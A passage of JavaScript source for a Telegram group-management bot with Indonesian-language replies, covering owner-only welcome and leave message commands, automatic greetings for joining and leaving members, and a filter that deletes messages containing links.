      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [[
          { text: `💬 Chat @${username}`, url: `https://t.me/${username}` }
        ]]
      }
    };

    bot.sendMessage(chatId, text, opts);
  } catch (err) {
    console.error('[ADD INVITE ONCE ERROR]', err.message);
    bot.sendMessage(chatId, '⚠️ Gagal membuat link sekali pakai. Pastikan bot admin & punya izin membuat link undangan.');
  }
});

// === SET WELCOME ===
bot.onText(/\/setwelcome (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
      const senderId = msg.from.id;

  // ⛔ Cek apakah yang kirim adalah OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus @RidzzOffc.",
            { parse_mode: "Markdown" }
        );
    }
  
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  groupSettings[chatId] = groupSettings[chatId] || {};
  groupSettings[chatId].welcome = match[1];
  saveGroupSettings();

  bot.sendMessage(chatId, "✅ Pesan welcome disimpan!");
});

// === SET LEAVE ===
bot.onText(/\/setleave (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
      const senderId = msg.from.id;

  // ⛔ Cek apakah yang kirim adalah OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus @RidzzOffc.",
            { parse_mode: "Markdown" }
        );
    }
  
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  groupSettings[chatId] = groupSettings[chatId] || {};
  groupSettings[chatId].leave = match[1];
  saveGroupSettings();

  bot.sendMessage(chatId, "✅ Pesan leave disimpan!");
});

// === WELCOME AUTO ===
bot.on('new_chat_members', (msg) => {
  const chatId = msg.chat.id;
  const setting = groupSettings[chatId];
  if (!setting?.welcome) return;

  const name = msg.new_chat_members[0]?.first_name || 'user';
  const text = setting.welcome.replace('{name}', name);
  bot.sendMessage(chatId, text);
});

// === LEAVE AUTO ===
bot.on('left_chat_member', (msg) => {
  const chatId = msg.chat.id;
  const setting = groupSettings[chatId];
  if (!setting?.leave) return;

  const name = msg.left_chat_member?.first_name || 'user';
  const text = setting.leave.replace('{name}', name);
  bot.sendMessage(chatId, text);
});

// === ANTILINK DETEKSI ===
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text || msg.caption || "";

  // ✅ Cek apakah fitur antilink aktif di grup ini
  if (!groupSettings[chatId]?.antilink) return;

  const pattern = /(?:https?:\/\/|t\.me\/|chat\.whatsapp\.com|wa\.me\/|@\w+)/i;
  if (pattern.test(text)) {
    bot.deleteMessage(chatId, msg.message_id).catch(() => {});
  }
});